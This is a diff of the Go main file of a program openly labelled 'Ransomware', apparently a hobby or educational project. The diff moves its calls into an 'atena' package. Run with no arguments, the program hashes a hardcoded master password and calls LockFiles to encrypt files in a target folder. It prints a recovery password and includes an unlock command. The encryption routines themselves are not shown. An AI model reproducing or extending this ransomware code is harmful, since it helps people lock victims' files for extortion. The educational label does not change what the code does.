@@ -7,81 +7,57 @@ import (
     "unsafe"
 
     "golang.org/x/sys/windows"
-    "main/modules"
+	atena "main/artefacts" // Se pone de alias para que jale los módulos
 )
-
-const (
-    VERSION       = "2.0"
-    TARGET_DIR    = "./archivos_privados"  // Carpeta objetivo
-    MAPPING_FILE  = ".secret_mapping.enc"  // Archivo con el mapeo
-    HIDDEN_FOLDER = ".hidden_data"         // Carpeta donde ocultar
-)
-
-// Variables globales, para la contraseña 
-
-var (
-    masterPassword   = "MadameYuDoberman"  // Master password
-    recoveryPassword = ""                   // Se genera dinámicamente
-)
-
-// FileMapping guarda la relación entre archivo original y oculto, los mapping son una especie de matrices en dónde se genera un "mapa" y guarda cosas en cada casilla
-type FileMapping struct {
-	// En originalPath se guardan los paths de los files originales para después re-ingresarlos
-    OriginalPath string `json:"original"` //Se usan json porque es para guardar datos en un formato entendible y legible
-	// El hiidingPath es lo mismo, se crea una carpeta en dónde se guardan todos los files y se guarda el path en este map
-    HiddenPath   string `json:"hidden"`
-}
-
-// Lista de personajes 
-var castlevaniaCharacters = []string{
-	"Carmilla", "Lenore", "Morana", "Tera", "Maria", "Annette", "Drolta", "Striga",
-}
 
 func main() {
     banner() // Mostramos el banner
 
-	// Si no hay argumentos, encriptar automáticamente
-	if len(os.Args) < 2 {
-		// Generar password de recuperación
-		recoveryPassword = modules.generatePasswd()
-		fmt.Println("\n[!] Your recovery password is:")
-		fmt.Printf("    %s\n\n", recoveryPassword)
-		
-		showWarning()
-		
-		// Encriptar con la master password
-		key := sha256.Sum256([]byte(masterPassword))
-		modules.lockFiles(key[:])
-		
-		showFuckOff()
-		help()
-		os.Exit(0)
-	}
+    // Si no hay argumentos, encriptar automáticamente
+    if len(os.Args) < 2 {
+        // Generar password de recuperación (VARIABLE LOCAL)
+        recoveryPassword := atena.GeneratePasswd() // <-- USAR GeneratePasswd()
+        
+        // Asignar la recovery password generada a la global del paquete atenea
+        atena.SetRecoveryPassword(recoveryPassword) // <-- FUNCIÓN NUEVA
 
-	// Los argumentos que se le pasarán a la herramienta
-	comando := os.Args[1]
+        fmt.Println("\n[!] Your recovery password is:")
+        fmt.Printf("    %s\n\n", recoveryPassword)
+        
+        showWarning()
+        
+        // Encriptar con la master password (VARIABLE EXPORTADA)
+        // Usar atena.MasterPassword y atena.LockFiles()
+        key := sha256.Sum256([]byte(atena.MasterPassword)) // <-- USAR atena.MasterPassword
+        atena.LockFiles(key[:]) // <-- USAR atena.LockFiles()
+        
+        showFuckOff()
+        help()
+        os.Exit(0)
+    }
 
-	switch comando { // Lista de comandos
-	case "a":
-		about()
-	case "u":
-		key := modules.getPsswd()  // Ahora retorna el hash directamente
-		modules.unlock(key)
-	case "g":
-		fmt.Println(modules.generatePasswd())
-	case "h":
-		help()
-	default: 
-		fmt.Println("[!] Not valid command:", comando)
-		help()
-		os.Exit(1)
-	}
+    // Los argumentos que se le pasarán a la herramienta
+    comando := os.Args[1]
+
+    switch comando { // Lista de comandos
+    case "a":
+        about()
+    case "u":
+        key := atena.GetPsswd()  // <-- USAR atena.GetPsswd()
+        atena.Unlock(key) // <-- USAR atena.Unlock()
+    case "g":
+        fmt.Println(atena.GeneratePasswd()) // <-- USAR atena.GeneratePasswd()
+    case "h":
+        help()
+    default: 
+        fmt.Println("Comando no reconocido. Usa -h para ayuda.")
+    }
 }
 
 //Lo que se va a imprimir en consola
 func banner() {
     fmt.Println("╔════════════════════════════╗")
-    fmt.Printf("║  Ransomware v%s           ║\n", VERSION) // Printf nos imprime con formato, algo parecido al -e en bash
+    fmt.Printf("║  Ransomware v%s           ║\n", atena.VERSION) // Printf nos imprime con formato, algo parecido al -e en bash
     fmt.Println("║  Educational Tool          ║")
     fmt.Println("╚════════════════════════════╝")
 	fmt.Println("                by: AreiaNight")
